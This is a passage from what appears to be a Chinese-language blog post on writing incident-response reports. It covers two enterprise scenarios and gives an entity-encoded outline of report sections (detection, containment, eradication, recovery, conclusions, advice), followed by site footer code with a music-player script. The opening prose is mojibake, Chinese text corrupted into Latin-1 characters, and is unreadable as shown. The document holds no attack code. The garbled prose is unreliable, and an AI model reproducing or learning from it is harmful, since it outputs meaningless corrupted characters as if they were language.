åœ¨æ€»ç»“é˜¶æ®µï¼Œå®‰å…¨å·¥ç¨‹å¸ˆéœ€è¦é’ˆå¯¹çªå‘äº‹ä»¶æ’°å†™åº”æ€¥å“åº”æŠ¥å‘Šã€‚é€šå¸¸ä¼šæœ‰å¦‚ä¸‹ä¸¤ç±»åœºæ™¯ï¼š<br>
</p>

<p>
1ã€ä¼ä¸šå…·å¤‡é…å¥—çš„åº”æ€¥å“åº”ç®¡ç†åˆ¶åº¦å’Œå®‰å…¨æªæ–½<br>
æŒ‰ç…§ä¼ä¸šå·²æœ‰çš„æ–¹æ³•æ¨¡æ¿æ’°å†™åº”æ€¥å“åº”æŠ¥å‘Šï¼ŒæŠ¥å‘Šå†…å®¹è¦éµå¾ªåº”æ€¥å“åº”PDCERFæµç¨‹ã€‚<br>
</p>

<p>
2ã€ä¼ä¸šä¸å…·å¤‡é…å¥—çš„åº”æ€¥å“åº”ç®¡ç†åˆ¶åº¦å’Œå®‰å…¨æªæ–½<br>
è¿™ç±»åœºæ™¯ä¹Ÿæ˜¯å®é™…å·¥ä½œä¸­æ¯”è¾ƒå¤šè§çš„åœºæ™¯ï¼Œä¼ä¸šä¸å…·å¤‡é…å¥—ç®¡ç†åˆ¶åº¦ï¼Œé¢å¯¹çªå‘äº‹ä»¶æ—¶ï¼Œç¼ºä¹æŒ‡å¯¼èƒ½åŠ›ã€‚æ­¤æ—¶åœ¨æ’°å†™åº”æ€¥å“åº”æŠ¥å‘Šæ—¶ï¼ŒæŠ¥å‘Šåº”åŒ…å«ä¸‹è¿°å†…å®¹ï¼š<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#22522;&#26412;&#20449;&#24687;&#65306;&#24212;&#24613;&#26102;&#38388;&#12289;&#24212;&#24613;&#20154;&#21592;&#12289;&#24212;&#24613;&#20107;&#20214;&#31867;&#22411;&amp;&#32423;&#21035;&#31561;&#23458;&#35266;&#20449;&#24687;&#65292;&#26681;&#25454;&#23454;&#38469;&#36827;&#34892;&#22635;&#20889;

&#20107;&#20214;&#32972;&#26223;&#65306;&#20107;&#20214;&#21457;&#29983;&#26102;&#38388;&#12289;&#20107;&#20214;&#29616;&#35937;

&#22788;&#29702;&#36807;&#31243;&#65306;&#26816;&#27979;&#12289;&#25233;&#21046;&#12289;&#26681;&#38500;&#12289;&#24674;&#22797;&#38454;&#27573;&#30340;&#20855;&#20307;&#24037;&#20316;
&#65288;1&#65289;&#26816;&#27979;&#65306;&#26681;&#25454;&#20107;&#20214;&#29616;&#35937;&#21435;&#21040;&#29616;&#26377;&#23433;&#20840;&#35774;&#22791;&#20013;&#36827;&#34892;&#21578;&#35686;&#25490;&#26597;&#65292;&#25110;&#32773;&#20351;&#29992;&#24037;&#20855;&#36827;&#34892;&#26597;&#30475;&#20998;&#26512;
&#65288;2&#65289;&#25233;&#21046;&#65306;&#37319;&#21462;&#20020;&#26102;&#38450;&#25252;&#25163;&#27573;&#36827;&#34892;&#19994;&#21153;&#24674;&#22797;&#65292;&#38477;&#20302;&#24433;&#21709;&#33539;&#22260;
&#65288;3&#65289;&#26681;&#38500;&#65306;&#23450;&#20301;&#21040;&#25915;&#20987;&#21407;&#22240;&#21518;&#65292;&#37319;&#29992;&#38548;&#31163;&#12289;&#21024;&#38500;&#12289;&#37325;&#32622;&#31561;&#25163;&#27573;&#28165;&#38500;&#24694;&#24847;&#31243;&#24207;&#12289;&#38459;&#26029;&#25915;&#20987;&#26469;&#28304;
&#65288;4&#65289;&#24674;&#22797;&#65306;&#25163;&#24037;&#39564;&#35777;&#30830;&#20445;&#19994;&#21153;&#24674;&#22797;&#27491;&#24120;

&#20107;&#20214;&#32467;&#35770;&#65306;&#32463;&#25490;&#26597;&#21518;&#24471;&#20986;&#30340;&#20107;&#20214;&#21407;&#22240;&#12289;&#22788;&#32622;&#32467;&#26524;
&#23433;&#20840;&#24314;&#35758;&#65306;&#26681;&#25454;&#20107;&#20214;&#21407;&#22240;&#32473;&#20986;&#38450;&#25252;&#24314;&#35758;&#65292;&#36991;&#20813;&#21516;&#31867;&#20107;&#20214;&#20877;&#27425;&#21457;&#29983;
&#30456;&#20851;&#38468;&#20214;&#65306;&#30149;&#27602;&#26679;&#26412;&#12289;&#24322;&#24120;&#27969;&#37327;&#12289;&#24694;&#24847;&#31243;&#24207;&#31561;&#26448;&#26009;
</pre>
</div>
</div>
</section>
</main class="container">
<footer id="postamble" class="status">
<footer data-astro-cid-sz7xmlte data-turbo-permanent id=rootFooter>
    <script>
        const shuffle = e => e.map((e => ({
            v: e,
            sort: Math.random()
        }))).sort(( (e, o) => e.sort - o.sort)).map(( ({v: e}) => e));
        var songList = ["barbie-girl--stantough", "blue-da-ba-dee--cornelius-link", "hips-dont-lie--stantough", "i-want-it-that-way--stantough", "seven-nation-army--stantough", "smooth-criminal--stantough"]
          , songOrder = songOrder ?? shuffle(songList).map((e => `/audio/music/${e}.opus`))
          , song = new Audio(songOrder[0])
          , nextSong = new Audio(songOrder[1])
          , songIndex = 2
          , musicWrapper = void 0
          , arrow = void 0
          , notes = void 0;
        song.addEventListener("ended", next);
        const toggle = () => song.paused ? play() : pause();
        function play() {
            song.play(),
            musicWrapper = musicWrapper || document.getElementById("musicWrapper"),
            notes = notes || document.getElementById("notesWrapper"),
            musicWrapper.classList.add("shakeManHorse"),
            notes.classList.remove("hideNotes")
        }
        function pause() {
            song.pause(),
            musicWrapper = musicWrapper || document.getElementById("musicWrapper"),
            notes = notes || document.getElementById("notesWrapper"),
            musicWrapper.classList.remove("shakeManHorse"),
            notes.classList.add("hideNotes")
        }
        function next() {
            song = nextSong,
            play(),
            songIndex === songOrder.length && (songIndex = 0),
            nextSong = new Audio(songOrder[songIndex]),
            songIndex += 1
        }
        function skip() {
            pause(),
            (arrow = arrow || document.getElementById("musicArrow")).classList.add("shootArrow");
            new Audio("/audio/effects/ohno.m4a").play(),
            arrow.addEventListener("animationend", arrowShootHandler, !1)
        }
        function arrowShootHandler() {
            arrow.removeEventListener("animationend", arrowShootHandler, !1),
            arrow.classList.remove("shootArrow");
            new Audio("/audio/effects/heythathurt.m4a").play(),
            next()
        }
    </script>
    <div id=musicPlayer data-astro-cid-q7a5pyro>
        <button class=skip data-astro-cid-q7a5pyro onclick=skip() title="Skip song">
            <div id=skipWrapper data-astro-cid-q7a5pyro>
                <img alt="Medieval drollery of a man/snail/bat/monkey shooting an arrow" class=archer decoding=async height=334 loading=lazy src=/images/archer-no-arrow.448ccd8b_Z1KfRYq.webp width=226 data-astro-cid-q7a5pyro>
                <img alt="Arrow for archer" class="arrow complete" decoding=async height=23 loading=lazy src=/images/no-archer-full-arrow.87aa9971_Z2qL2KO.webp width=141 data-astro-cid-q7a5pyro id=musicArrow>
            </div>
        </button>
        <button class=playPause data-astro-cid-q7a5pyro onclick=toggle() title="Play/pause song">
            <div id=musicWrapper data-astro-cid-q7a5pyro>
                <div class=hideNotes id=notesWrapper data-astro-cid-q7a5pyro>
                    <div class=lyreNotes data-astro-cid-6gcrueho>
                        <div class=note1 data-astro-cid-6gcrueho>&#9835;&#9833;</div>
                        <div class=note2 data-astro-cid-6gcrueho>&#9833;</div>
                        <div class=note3 data-astro-cid-6gcrueho>&#9839;&#9834;</div>
                        <div class=note4 data-astro-cid-6gcrueho>&#9834;</div>
                    </div>
                    <div class=fluteNotes data-astro-cid-6gcrueho>
                        <div class=note1 data-astro-cid-6gcrueho>&#9835;&#9833;</div>
                        <div class=note2 data-astro-cid-6gcrueho>&#9833;</div>
                        <div class=note3 data-astro-cid-6gcrueho>&#9839;&#9834;</div>
                        <div class=note4 data-astro-cid-6gcrueho>&#9834;</div>
                    </div>
                </div>
                <img alt="Medieval drollery of a man/horse playing a lyre and a horn" class=manHorse decoding=async height=665 loading=lazy src=/images/man-horse-band.e3a2efcf_q8FCa.webp width=531 data-astro-cid-q7a5pyro>
            </div>
        </button>
    </div>
    <hr data-astro-cid-sz7xmlte>
    <div class=salutation data-astro-cid-gdmrbrho>
        <p data-astro-cid-gdmrbrho>
            <span class=flower2 data-astro-cid-gdmrbrho>A</span>
            <span class=smallcap data-astro-cid-gdmrbrho>pax vobiscum</span>
            <span class="flower2 wiggle" data-astro-cid-gdmrbrho id=leaf>a</span>
        </p>
    </div>
    <script>
        function animateLeafBlownHandler() {
            leaf.removeEventListener("animationend", animateLeafBlownHandler, !1),
            leaf.classList.remove("blownAway"),
            leaf.classList.add("wiggle")
        }
        function animateLeaf() {
            leaf = leaf ?? document.getElementById("leaf"),
            leaf.classList.remove("wiggle"),
            leaf.classList.add("blownAway"),
            leaf.addEventListener("animationend", animateLeafBlownHandler, !1)
        }
        document.getElementById("leaf").onclick = animateLeaf
    </script>


    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>æ‰“èµ</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Â© 2024 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
</footer>
</footer>
</body>
</html>
